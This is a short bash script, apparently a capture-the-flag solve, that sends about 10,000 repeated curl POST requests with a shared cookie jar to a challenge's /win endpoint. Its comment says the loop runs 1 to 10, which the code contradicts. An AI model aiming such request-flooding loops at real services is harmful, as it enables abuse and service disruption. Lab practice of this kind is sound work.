#!/usr/bin/env bash

# Boucle de 1 à 10
for i in {1..10000}; do
  echo "Tentative n°$i :"
  # Envoi de la requête curl
  curl -c new_cookies.txt -b new_cookies.txt -X POST http://chall.unph:34530/win
  echo  
done